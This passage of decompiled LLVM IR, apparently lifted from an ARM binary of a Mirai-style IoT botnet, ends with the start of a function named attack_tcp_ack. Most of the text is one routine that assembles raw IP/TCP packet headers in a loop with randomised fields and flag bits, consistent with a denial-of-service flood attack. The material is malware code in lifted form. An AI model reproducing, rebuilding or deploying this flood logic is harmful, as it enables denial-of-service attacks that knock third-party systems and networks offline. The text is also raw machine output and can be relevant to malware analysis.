  %v1_b8c8 = call i32 @__GI___libc_close(i32 %v0_b8c4)
  store i32 %v1_b8c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b8cc

dec_label_pc_b8cc:                                ; preds = %dec_label_pc_b6a4, %dec_label_pc_b94c, %entry, %dec_label_pc_b8c4
  %v1_b8d4 = phi i32 [ %v3_b588, %entry ], [ %v1_b8c8, %dec_label_pc_b8c4 ], [ %v2_b950, %dec_label_pc_b94c ], [ 0, %dec_label_pc_b6a4 ]
  store i32 %v3_b394, i32* %r4.global-to-local, align 4
  store i32 %v27_b394, i32* %lr.global-to-local, align 4
  ret i32 %v1_b8d4

dec_label_pc_b8d8:                                ; preds = %bb72
  %v1_b8d8 = add i32 %v4_b63c, 16
  %v2_b8d8 = inttoptr i32 %v1_b8d8 to i32*
  %v3_b8d8 = load i32, i32* %v2_b8d8, align 4
  store i32 %v3_b8d8, i32* @r4, align 4
  %v0_b8dc = call i32 @rand_next()
  store i32 %v0_b8dc, i32* %r0.global-to-local, align 4
  %v3_b8e0 = load i32, i32* %stack_var_-44, align 4
  %v5_b8e8 = mul i32 %v3_b8e0, 24
  %v0_b8ec = load i32, i32* @r4, align 4
  %v1_b8ec = and i32 %v0_b8ec, 16711680
  store i32 %v1_b8ec, i32* %ip.global-to-local, align 4
  %v3_b8f0 = udiv i32 %v0_b8ec, 16777216
  %v4_b8f4 = udiv i32 %v1_b8ec, 256
  %v5_b8f4 = or i32 %v4_b8f4, %v3_b8f0
  store i32 %v5_b8f4, i32* %r2.global-to-local, align 4
  %v1_b8f8 = load i32, i32* @fp, align 4
  %v2_b8f8 = add i32 %v1_b8f8, %v5_b8e8
  store i32 %v2_b8f8, i32* %r1.global-to-local, align 4
  %v1_b8fc = and i32 %v0_b8ec, 65280
  store i32 %v1_b8fc, i32* %r3.global-to-local, align 4
  %v1_b900 = add i32 %v2_b8f8, 20
  %v2_b900 = inttoptr i32 %v1_b900 to i8*
  %v3_b900 = load i8, i8* %v2_b900, align 1
  %v4_b900 = zext i8 %v3_b900 to i32
  store i32 %v4_b900, i32* %ip.global-to-local, align 4
  %v5_b908 = call i32 @llvm.bswap.i32(i32 %v0_b8ec)
  %v7_b90c = lshr i32 %v0_b8dc, %v4_b900
  %v8_b90c = add i32 %v7_b90c, %v5_b908
  store i32 %v8_b90c, i32* %r2.global-to-local, align 4
  %v1_b910 = and i32 %v8_b90c, 16711680
  store i32 %v1_b910, i32* %r0.global-to-local, align 4
  %v1_b91c = and i32 %v8_b90c, 65280
  store i32 %v1_b91c, i32* %r1.global-to-local, align 4
  %v5_b924 = call i32 @llvm.bswap.i32(i32 %v8_b90c)
  store i32 %v5_b924, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b644

dec_label_pc_b930:                                ; preds = %dec_label_pc_b644
  %v0_b930 = call i32 @rand_next()
  %v1_b930 = trunc i32 %v0_b930 to i16
  store i32 %v0_b930, i32* %r0.global-to-local, align 4
  store i32 %v2_b620, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b668

dec_label_pc_b94c:                                ; preds = %dec_label_pc_b7a8, %dec_label_pc_b768
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b950 = call i32 @__GI_time(i32* null)
  store i32 %v2_b950, i32* %r0.global-to-local, align 4
  store i32 %v2_b574, i32* %r2.global-to-local, align 4
  %v6_b95c = icmp slt i32 %v2_b574, %v2_b950
  br i1 %v6_b95c, label %dec_label_pc_b8cc, label %dec_label_pc_b768

dec_label_pc_b964:                                ; preds = %dec_label_pc_b714
  %v3_b964 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b964, i32* @r5, align 4
  store i32 %v2_b3c0, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-340.0.ph, i32* %r0.global-to-local, align 4
  %v5_b970 = mul i32 %v3_b964, 16
  %v6_b970 = add i32 %v5_b970, %v2_b3c0
  %v7_b970 = inttoptr i32 %v6_b970 to i32*
  store i32 %v0_b970, i32* %v7_b970, align 4
  %v0_b974 = load i32, i32* %r0.global-to-local, align 4
  %v1_b974 = add i32 %v0_b974, 4
  %v2_b974 = inttoptr i32 %v1_b974 to i32*
  %v3_b974 = load i32, i32* %v2_b974, align 4
  %v1_b978 = and i32 %v3_b974, 16711680
  store i32 %v1_b978, i32* %r0.global-to-local, align 4
  %v5_b98c = call i32 @llvm.bswap.i32(i32 %v3_b974)
  store i32 %v5_b98c, i32* %r3.global-to-local, align 4
  store i32 %v2_b3c0, i32* %r1.global-to-local, align 4
  %v0_b994 = load i32, i32* @r5, align 4
  %v3_b994 = mul i32 %v0_b994, 16
  %v2_b998 = add i32 %v3_b994, %v2_b3c0
  store i32 %v2_b998, i32* %ip.global-to-local, align 4
  %v2_b99c = add i32 %v2_b998, 4
  %v3_b99c = inttoptr i32 %v2_b99c to i32*
  store i32 %v5_b98c, i32* %v3_b99c, align 4
  store i32 %stack_var_-340.0.ph, i32* %r2.global-to-local, align 4
  %v1_b9a4 = add i32 %stack_var_-340.0.ph, 8
  %v2_b9a4 = inttoptr i32 %v1_b9a4 to i32*
  %v3_b9a4 = load i32, i32* %v2_b9a4, align 4
  %v1_b9b0 = and i32 %v3_b9a4, 65280
  store i32 %v1_b9b0, i32* %r2.global-to-local, align 4
  %v5_b9bc = call i32 @llvm.bswap.i32(i32 %v3_b9a4)
  store i32 %v5_b9bc, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-340.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v6_b544, i32* %r0.global-to-local, align 4
  %v1_b9c8 = add i32 %stack_var_-340.0.ph, 2
  %v2_b9c8 = inttoptr i32 %v1_b9c8 to i16*
  %v3_b9c8 = load i16, i16* %v2_b9c8, align 2
  %v4_b9c8 = zext i16 %v3_b9c8 to i32
  store i32 %v4_b9c8, i32* %r1.global-to-local, align 4
  store i32 %v1_b9cc, i32* @r4, align 4
  %v2_b9d0 = load i32, i32* %ip.global-to-local, align 4
  %v3_b9d0 = add i32 %v2_b9d0, 12
  %v4_b9d0 = inttoptr i32 %v3_b9d0 to i16*
  store i16 %v3_b9c8, i16* %v4_b9d0, align 2
  %v0_b9d4 = load i32, i32* @lr, align 4
  %v1_b9d4 = trunc i32 %v0_b9d4 to i16
  %v2_b9d4 = load i32, i32* %ip.global-to-local, align 4
  %v3_b9d4 = add i32 %v2_b9d4, 14
  %v4_b9d4 = inttoptr i32 %v3_b9d4 to i16*
  store i16 %v1_b9d4, i16* %v4_b9d4, align 2
  %v0_b9d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b9d8 = load i32, i32* %ip.global-to-local, align 4
  %v2_b9d8 = add i32 %v1_b9d8, 8
  %v3_b9d8 = inttoptr i32 %v2_b9d8 to i32*
  store i32 %v0_b9d8, i32* %v3_b9d8, align 4
  %v0_b9dc = load i32, i32* @r4, align 4
  store i32 %v0_b9dc, i32* @r0, align 4
  %v0_b9e0 = call i32 @malloc()
  store i32 %v0_b9e0, i32* %r0.global-to-local, align 4
  store i32 %v2_b3d0, i32* %r3.global-to-local, align 4
  %v2_b9ec = load i32, i32* @r5, align 4
  %v5_b9ec = mul i32 %v2_b9ec, 4
  %v6_b9ec = add i32 %v5_b9ec, %v2_b3d0
  %v7_b9ec = inttoptr i32 %v6_b9ec to i32*
  store i32 %v0_b9e0, i32* %v7_b9ec, align 4
  %v3_b9f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b9f0, i32* %r2.global-to-local, align 4
  %v0_b9f4 = load i32, i32* %r3.global-to-local, align 4
  %v4_b9f4 = mul i32 %v3_b9f0, 4
  %v5_b9f4 = add i32 %v0_b9f4, %v4_b9f4
  %v6_b9f4 = inttoptr i32 %v5_b9f4 to i32*
  %v7_b9f4 = load i32, i32* %v6_b9f4, align 4
  store i32 %v7_b9f4, i32* %ip.global-to-local, align 4
  %v1_b9f8 = inttoptr i32 %v7_b9f4 to i8*
  %v2_b9f8 = load i8, i8* %v1_b9f8, align 1
  %tmp102 = urem i8 %v2_b9f8, 16
  %v1_b9fc = zext i8 %tmp102 to i32
  %v1_ba00 = or i32 %v1_b9fc, 64
  store i32 %v1_ba00, i32* %r3.global-to-local, align 4
  %v1_ba04 = trunc i32 %v1_ba00 to i8
  store i8 %v1_ba04, i8* %v1_b9f8, align 1
  %v0_ba08 = load i32, i32* %ip.global-to-local, align 4
  %v1_ba08 = inttoptr i32 %v0_ba08 to i8*
  %v2_ba08 = load i8, i8* %v1_ba08, align 1
  store i32 %v4_ba0c, i32* %lr.global-to-local, align 4
  %v1_ba10 = and i8 %v2_ba08, -16
  %v1_ba1c = or i8 %v1_ba10, 5
  %v0_ba20 = load i32, i32* @r4, align 4
  %v3_ba20 = mul i32 %v0_ba20, 65536
  store i32 %v3_ba20, i32* %r4.global-to-local, align 4
  store i32 %v5_ba24, i32* %r1.global-to-local, align 4
  store i32 %v1_b450, i32* %r0.global-to-local, align 4
  store i8 %v1_ba1c, i8* %v1_ba08, align 1
  %v0_ba30 = load i32, i32* %r1.global-to-local, align 4
  %v1_ba30 = trunc i32 %v0_ba30 to i16
  %v2_ba30 = load i32, i32* %ip.global-to-local, align 4
  %v3_ba30 = add i32 %v2_ba30, 4
  %v4_ba30 = inttoptr i32 %v3_ba30 to i16*
  store i16 %v1_ba30, i16* %v4_ba30, align 2
  %v0_ba34 = load i32, i32* %r4.global-to-local, align 4
  %v3_ba34 = udiv i32 %v0_ba34, 256
  %v1_ba3c = and i32 %v3_ba34, 65280
  store i32 %v1_ba3c, i32* %r2.global-to-local, align 4
  %v2_ba40 = load i32, i32* %ip.global-to-local, align 4
  %v3_ba40 = add i32 %v2_ba40, 1
  %v4_ba40 = inttoptr i32 %v3_ba40 to i8*
  store i8 %v5_b408, i8* %v4_ba40, align 1
  %v0_ba44 = load i32, i32* %r2.global-to-local, align 4
  %v1_ba44 = load i32, i32* %r4.global-to-local, align 4
  %v4_ba44 = udiv i32 %v1_ba44, 16777216
  %v5_ba44 = or i32 %v4_ba44, %v0_ba44
  %v1_ba48 = trunc i32 %v5_ba44 to i16
  %v2_ba48 = load i32, i32* %ip.global-to-local, align 4
  %v3_ba48 = add i32 %v2_ba48, 2
  %v4_ba48 = inttoptr i32 %v3_ba48 to i16*
  store i16 %v1_ba48, i16* %v4_ba48, align 2
  %v0_ba50 = load i32, i32* %ip.global-to-local, align 4
  %v1_ba50 = add i32 %v0_ba50, 20
  store i32 %v1_ba50, i32* %r3.global-to-local, align 4
  %v3_ba54 = add i32 %v0_ba50, 8
  %v4_ba54 = inttoptr i32 %v3_ba54 to i8*
  store i8 %v5_b440, i8* %v4_ba54, align 1
  %v0_ba58 = load i32, i32* %r3.global-to-local, align 4
  %v2_ba60 = load i32, i32* %ip.global-to-local, align 4
  %v3_ba60 = add i32 %v2_ba60, 9
  %v4_ba60 = inttoptr i32 %v3_ba60 to i8*
  store i8 6, i8* %v4_ba60, align 1
  store i32 ptrtoint (i32* @global_var_27164.91 to i32), i32* %r2.global-to-local, align 4
  %v2_ba68 = load i32, i32* @global_var_27164.91, align 4
  store i32 %v2_ba68, i32* %r1.global-to-local, align 4
  %v1_ba6c = load i32, i32* %ip.global-to-local, align 4
  %v2_ba6c = add i32 %v1_ba6c, 12
  %v3_ba6c = inttoptr i32 %v2_ba6c to i32*
  store i32 %v2_ba68, i32* %v3_ba6c, align 4
  %v0_ba70 = load i32, i32* %r0.global-to-local, align 4
  %v2_ba70 = icmp eq i32 %v0_ba70, 0
  %v3_ba74 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ba74, i32* %r3.global-to-local, align 4
  store i32 %v2_b3c0, i32* %r0.global-to-local, align 4
  br i1 %v2_ba70, label %.thread10, label %bb83

bb83:                                             ; preds = %dec_label_pc_b964
  store i32 64, i32* %lr.global-to-local, align 4
  %v3_ba80 = load i32, i32* %ip.global-to-local, align 4
  %v4_ba80 = add i32 %v3_ba80, 6
  %v5_ba80 = inttoptr i32 %v4_ba80 to i16*
  store i16 64, i16* %v5_ba80, align 2
  %v0_ba84.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_ba84.pre = load i32, i32* %r3.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_b964, %bb83
  %v0_ba88 = phi i32 [ %v3_ba74, %dec_label_pc_b964 ], [ %v1_ba84.pre, %bb83 ]
  %v1_ba8c = phi i32 [ %v2_b3c0, %dec_label_pc_b964 ], [ %v0_ba84.pre, %bb83 ]
  %v4_ba84 = mul i32 %v0_ba88, 16
  %v5_ba84 = add i32 %v4_ba84, %v1_ba8c
  %v6_ba84 = inttoptr i32 %v5_ba84 to i32*
  %v7_ba84 = load i32, i32* %v6_ba84, align 4
  store i32 %v7_ba84, i32* %r2.global-to-local, align 4
  store i32 %v5_ba84, i32* %r3.global-to-local, align 4
  %v1_ba90 = load i32, i32* %ip.global-to-local, align 4
  %v2_ba90 = add i32 %v1_ba90, 16
  %v3_ba90 = inttoptr i32 %v2_ba90 to i32*
  store i32 %v7_ba84, i32* %v3_ba90, align 4
  %v0_ba94 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba94 = add i32 %v0_ba94, 12
  %v2_ba94 = inttoptr i32 %v1_ba94 to i16*
  %v3_ba94 = load i16, i16* %v2_ba94, align 2
  %v4_ba94 = zext i16 %v3_ba94 to i32
  store i32 %v4_ba94, i32* %r1.global-to-local, align 4
  %v0_ba98 = load i32, i32* %ip.global-to-local, align 4
  %v1_ba98 = add i32 %v0_ba98, 40
  store i32 %v1_ba98, i32* @r4, align 4
  %v3_ba9c = add i32 %v0_ba98, 20
  %v4_ba9c = inttoptr i32 %v3_ba9c to i16*
  store i16 %v3_ba94, i16* %v4_ba9c, align 2
  store i32 %v0_ba58, i32* %ip.global-to-local, align 4
  %v0_baa4 = load i32, i32* %r3.global-to-local, align 4
  %v1_baa4 = add i32 %v0_baa4, 8
  %v2_baa4 = inttoptr i32 %v1_baa4 to i32*
  %v3_baa4 = load i32, i32* %v2_baa4, align 4
  store i32 %v3_baa4, i32* %r1.global-to-local, align 4
  %v2_baa8 = add i32 %v0_ba58, 4
  %v3_baa8 = inttoptr i32 %v2_baa8 to i32*
  store i32 %v3_baa4, i32* %v3_baa8, align 4
  %v0_baac = load i32, i32* %ip.global-to-local, align 4
  %v1_baac = add i32 %v0_baac, 13
  %v2_baac = inttoptr i32 %v1_baac to i8*
  %v3_baac = load i8, i8* %v2_baac, align 1
  %v4_baac = zext i8 %v3_baac to i32
  store i32 %v4_baac, i32* %r2.global-to-local, align 4
  %v0_bab0 = load i32, i32* %r3.global-to-local, align 4
  %v1_bab0 = add i32 %v0_bab0, 4
  %v2_bab0 = inttoptr i32 %v1_bab0 to i32*
  %v3_bab0 = load i32, i32* %v2_bab0, align 4
  store i32 %v3_bab0, i32* %r1.global-to-local, align 4
  %v1_bab4 = add i32 %v0_bab0, 14
  %v2_bab4 = inttoptr i32 %v1_bab4 to i16*
  %v3_bab4 = load i16, i16* %v2_bab4, align 2
  %v4_bab4 = zext i16 %v3_bab4 to i32
  store i32 %v4_bab4, i32* %r3.global-to-local, align 4
  %v1_bab8 = or i32 %v4_baac, 1
  store i32 %v1_bab8, i32* %r2.global-to-local, align 4
  %v3_babc = add i32 %v0_baac, 2
  %v4_babc = inttoptr i32 %v3_babc to i16*
  store i16 %v3_bab4, i16* %v4_babc, align 2
  %v0_bac0 = load i32, i32* %r2.global-to-local, align 4
  %v1_bac0 = trunc i32 %v0_bac0 to i8
  %v2_bac0 = load i32, i32* %ip.global-to-local, align 4
  %v3_bac0 = add i32 %v2_bac0, 13
  %v4_bac0 = inttoptr i32 %v3_bac0 to i8*
  store i8 %v1_bac0, i8* %v4_bac0, align 1
  %v0_bac4 = load i32, i32* %ip.global-to-local, align 4
  %v1_bac4 = add i32 %v0_bac4, 12
  %v2_bac4 = inttoptr i32 %v1_bac4 to i8*
  %v3_bac4 = load i8, i8* %v2_bac4, align 1
  %v4_bac4 = zext i8 %v3_bac4 to i32
  store i32 %v4_bac4, i32* %r3.global-to-local, align 4
  %v1_bac8 = add i32 %v0_bac4, 13
  %v2_bac8 = inttoptr i32 %v1_bac8 to i8*
  %v3_bac8 = load i8, i8* %v2_bac8, align 1
  %v4_bac8 = zext i8 %v3_bac8 to i32
  %tmp103 = urem i8 %v3_bac4, 16
  %v1_bacc = zext i8 %tmp103 to i32
  %v1_bad0 = or i32 %v1_bacc, 128
  store i32 %v1_bad0, i32* %r3.global-to-local, align 4
  %v1_bad4 = or i32 %v4_bac8, 16
  store i32 %v1_bad4, i32* %r2.global-to-local, align 4
  %v0_bad8 = load i32, i32* %r1.global-to-local, align 4
  %v2_bad8 = add i32 %v0_bac4, 8
  %v3_bad8 = inttoptr i32 %v2_bad8 to i32*
  store i32 %v0_bad8, i32* %v3_bad8, align 4
  %v0_badc = load i32, i32* %r3.global-to-local, align 4
  %v1_badc = trunc i32 %v0_badc to i8
  %v2_badc = load i32, i32* %ip.global-to-local, align 4
  %v3_badc = add i32 %v2_badc, 12
  %v4_badc = inttoptr i32 %v3_badc to i8*
  store i8 %v1_badc, i8* %v4_badc, align 1
  %v0_bae0 = load i32, i32* %r2.global-to-local, align 4
  %v1_bae0 = trunc i32 %v0_bae0 to i8
  %v2_bae0 = load i32, i32* %ip.global-to-local, align 4
  %v3_bae0 = add i32 %v2_bae0, 13
  %v4_bae0 = inttoptr i32 %v3_bae0 to i8*
  store i8 %v1_bae0, i8* %v4_bae0, align 1
  %v0_bae4 = call i32 @rand_next()
  %v1_bae4 = trunc i32 %v0_bae4 to i16
  store i32 %v0_bae4, i32* %r0.global-to-local, align 4
  store i32 %v0_ba58, i32* %lr.global-to-local, align 4
  store i32 %v1_b48c, i32* %r1.global-to-local, align 4
  %v1_baf0 = add i32 %v0_ba58, 13
  %v2_baf0 = inttoptr i32 %v1_baf0 to i8*
  %v3_baf0 = load i8, i8* %v2_baf0, align 1
  %v4_baf0 = zext i8 %v3_baf0 to i32
  store i32 %v1_baf4, i32* %r2.global-to-local, align 4
  %v1_baf8 = and i32 %v4_baf0, 223
  %v5_bafc = or i32 %v1_baf8, %v4_bafc
  store i32 %v5_bafc, i32* %r3.global-to-local, align 4
  %v1_bb00 = trunc i32 %v5_bafc to i8
  store i8 %v1_bb00, i8* %v2_baf0, align 1
  store i32 %v1_b4ac, i32* %ip.global-to-local, align 4
  %v0_bb08 = load i32, i32* %lr.global-to-local, align 4
  %v1_bb08 = add i32 %v0_bb08, 13
  %v2_bb08 = inttoptr i32 %v1_bb08 to i8*
  %v3_bb08 = load i8, i8* %v2_bb08, align 1
  %v4_bb08 = zext i8 %v3_bb08 to i32
  store i32 %v1_bb0c, i32* %r3.global-to-local, align 4
  %v1_bb10 = and i32 %v4_bb08, 239
  %v5_bb14 = or i32 %v1_bb10, %v4_bb14
  store i32 %v5_bb14, i32* %r2.global-to-local, align 4
  %v1_bb18 = trunc i32 %v5_bb14 to i8
  store i8 %v1_bb18, i8* %v2_bb08, align 1
  %v0_bb1c = load i32, i32* %lr.global-to-local, align 4
  %v1_bb1c = add i32 %v0_bb1c, 13
  %v2_bb1c = inttoptr i32 %v1_bb1c to i8*
  %v3_bb1c = load i8, i8* %v2_bb1c, align 1
  %v4_bb1c = zext i8 %v3_bb1c to i32
  store i32 %v1_b4cc, i32* %lr.global-to-local, align 4
  store i32 %v0_ba58, i32* %r1.global-to-local, align 4
  store i32 %v1_bb28, i32* %r2.global-to-local, align 4
  %v1_bb2c = and i32 %v4_bb1c, 247
  %v5_bb30 = or i32 %v1_bb2c, %v4_bb30
  store i32 %v5_bb30, i32* %r3.global-to-local, align 4
  %v1_bb34 = trunc i32 %v5_bb30 to i8
  store i8 %v1_bb34, i8* %v2_baf0, align 1
  store i32 %v1_b4ec, i32* %ip.global-to-local, align 4
  %v0_bb3c = load i32, i32* %r1.global-to-local, align 4
  %v1_bb3c = add i32 %v0_bb3c, 13
  %v2_bb3c = inttoptr i32 %v1_bb3c to i8*
  %v3_bb3c = load i8, i8* %v2_bb3c, align 1
  %v4_bb3c = zext i8 %v3_bb3c to i32
  store i32 %v1_bb40, i32* %r3.global-to-local, align 4
  %v1_bb44 = and i32 %v4_bb3c, 251
  %v5_bb48 = or i32 %v1_bb44, %v4_bb48
  store i32 %v5_bb48, i32* %r2.global-to-local, align 4
  %v1_bb4c = trunc i32 %v5_bb48 to i8
  store i8 %v1_bb4c, i8* %v2_bb3c, align 1
  store i32 %v1_b50c, i32* @lr, align 4
  %v0_bb54 = load i32, i32* %r1.global-to-local, align 4
  %v1_bb54 = add i32 %v0_bb54, 13
  %v2_bb54 = inttoptr i32 %v1_bb54 to i8*
  %v3_bb54 = load i8, i8* %v2_bb54, align 1
  %v4_bb54 = zext i8 %v3_bb54 to i32
  store i32 %v1_bb58, i32* %r2.global-to-local, align 4
  %v1_bb5c = and i32 %v4_bb54, 253
  %v4_bb60 = or i32 %v1_bb5c, %v3_bb60
  store i32 %v4_bb60, i32* %r3.global-to-local, align 4
  %v1_bb64 = trunc i32 %v4_bb60 to i8
  store i8 %v1_bb64, i8* %v2_bb54, align 1
  %v0_bb68 = load i32, i32* %r1.global-to-local, align 4
  %v1_bb68 = add i32 %v0_bb68, 13
  %v2_bb68 = inttoptr i32 %v1_bb68 to i8*
  %v3_bb68 = load i8, i8* %v2_bb68, align 1
  %v4_bb68 = zext i8 %v3_bb68 to i32
  %v1_bb70 = and i32 %v4_bb68, 254
  %v2_bb78 = or i32 %v1_bb70, %v1_bb74
  store i32 %v2_bb78, i32* %r3.global-to-local, align 4
  store i32 %v0_ba58, i32* %r2.global-to-local, align 4
  %v1_bb80 = trunc i32 %v2_bb78 to i8
  store i8 %v1_bb80, i8* %v2_baf0, align 1
  %v3_bb84 = load i32, i32* %r2.global-to-local, align 4
  %v4_bb84 = add i32 %v3_bb84, 14
  %v5_bb84 = inttoptr i32 %v4_bb84 to i16*
  store i16 %v1_bae4, i16* %v5_bb84, align 2
  store i32 %v6_b544, i32* %r1.global-to-local, align 4
  %v0_bb8c = load i32, i32* @r4, align 4
  store i32 %v0_bb8c, i32* %r0.global-to-local, align 4
  %v2_bb90 = call i32 @rand_alphastr(i32 %v0_bb8c, i32 %v6_b544)
  store i32 %v2_bb90, i32* %r0.global-to-local, align 4
  store i32 %v6_b544, i32* %ip.global-to-local, align 4
  %v2_bb9c = load i32, i32* @r4, align 4
  %v4_bb9c = add i32 %v2_bb9c, %v6_b544
  %v5_bb9c = inttoptr i32 %v4_bb9c to i8*
  store i8 0, i8* %v5_bb9c, align 1
  %v3_bba0 = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* @lr, align 4
  %v1_bba8 = add i32 %v3_bba0, 1
  store i32 %v1_bba8, i32* @r3, align 4
  store i32 %v1_bba8, i32* %stack_var_-44, align 4
  %v5_bbb4 = icmp slt i32 %v1_bba8, %arg2
  br i1 %v5_bbb4, label %dec_label_pc_b5dc.outer, label %dec_label_pc_b768.preheader

; uselistorder directives
  uselistorder i32 %v1_bba8, { 1, 0, 2 }
  uselistorder i8* %v2_baf0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_bae4, { 1, 0 }
  uselistorder i32 %v0_ba58, { 1, 2, 4, 3, 6, 5, 0 }
  uselistorder i32 %v5_b98c, { 1, 0 }
  uselistorder i32 %v2_b950, { 1, 2, 0 }
  uselistorder i32 %v0_b930, { 1, 0 }
  uselistorder i32 %v0_b8ec, { 1, 2, 0, 3 }
  uselistorder i32 %v7_b880, { 0, 2, 3, 1 }
  uselistorder i32 %v1_b868, { 1, 2, 0, 3 }
  uselistorder i32 %v5_b830, { 1, 0 }
  uselistorder i32 %v4_b820, { 1, 0 }
  uselistorder i32 %v3_b7ec, { 1, 0 }
  uselistorder i32 %v3_b7cc, { 3, 2, 0, 1 }
  uselistorder i32 %v2_b7b8, { 1, 0 }
  uselistorder i32 %v3_b790, { 1, 0 }
  uselistorder i32 %v1_b784, { 2, 0, 1 }
  uselistorder i32 %v1_b758, { 1, 0, 2 }
  uselistorder i32 %v3_b740, { 0, 2, 3, 1 }
  uselistorder i32 %v4_b708, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 3, 1, 2 }
  uselistorder i32 %v0_b64c, { 1, 0, 2 }
  uselistorder i32 %v0_b970, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %v4_b63c, { 1, 0 }
  uselistorder i1 %v7_b634, { 1, 0 }
  uselistorder i32 %v3_b5e8, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %stack_var_-340.0.ph, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v1_bb58, { 1, 0 }
  uselistorder i32 %v1_bb40, { 1, 0 }
  uselistorder i32 %v1_bb0c, { 1, 0 }
  uselistorder i32 %v3_b700, { 1, 0 }
  uselistorder i32 %v1_bb28, { 1, 0 }
  uselistorder i32 %v1_baf4, { 1, 0 }
  uselistorder i32 %v4_ba0c, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v1_b9cc, { 2, 0, 1 }
  uselistorder i32 %v1_b718, { 1, 0 }
  uselistorder i32 %v4_b714, { 2, 0, 1 }
  uselistorder i32 %v2_b620, { 3, 2, 1, 4, 0 }
  uselistorder i16 %v5_b5d4, { 1, 0 }
  uselistorder i32 %v0_b5c4, { 1, 0 }
  uselistorder i32 %v3_b588, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_b574, { 1, 0 }
  uselistorder i32 %v1_b564, { 2, 1, 0 }
  uselistorder i32 %v6_b544, { 2, 7, 6, 5, 8, 3, 12, 11, 10, 13, 4, 0, 9, 1 }
  uselistorder i32 %v1_b50c, { 1, 0 }
  uselistorder i32 %v1_b4ec, { 1, 0 }
  uselistorder i32 %v1_b4cc, { 1, 0 }
  uselistorder i32 %v1_b4ac, { 1, 0 }
  uselistorder i32 %v1_b48c, { 1, 0 }
  uselistorder i32 %v6_b468, { 1, 0 }
  uselistorder i32 %v1_b450, { 1, 0 }
  uselistorder i32 %v5_b424, { 1, 0 }
  uselistorder i32 %v6_b3e8, { 1, 0 }
  uselistorder i32 %v2_b3d0, { 0, 2, 1, 3 }
  uselistorder i32 %v2_b3c0, { 3, 4, 0, 5, 1, 6, 2, 7 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 39, 40, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 25, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 46, 45, 47, 49, 48, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 7, 3, 4, 5, 6, 12, 8, 9, 10, 11, 14, 13, 16, 15, 17, 19, 18, 22, 20, 26, 21, 23, 25, 24, 29, 27, 28, 30, 31, 32, 34, 35, 33, 36, 38, 37, 40, 39, 43, 42, 41, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 0 }
  uselistorder i32 %arg2, { 3, 2, 1, 6, 7, 5, 4, 0, 8, 10, 9, 11, 12, 13 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %dec_label_pc_b8cc, { 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_b898, { 1, 0 }
  uselistorder label %dec_label_pc_b7a8, { 1, 0 }
  uselistorder label %dec_label_pc_b768, { 1, 0 }
  uselistorder label %dec_label_pc_b694, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_b668, { 1, 0 }
  uselistorder label %dec_label_pc_b644, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_b5f8, { 1, 0 }
  uselistorder label %dec_label_pc_b5dc, { 1, 0 }
  uselistorder label %dec_label_pc_b5dc.outer, { 1, 0 }
}

define i32 @attack_tcp_ack(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_bbc0 = load i32, i32* @sb, align 4
  %v24_bbc0 = load i32, i32* @fp, align 4
  %v27_bbc0 = load i32, i32* @lr, align 4
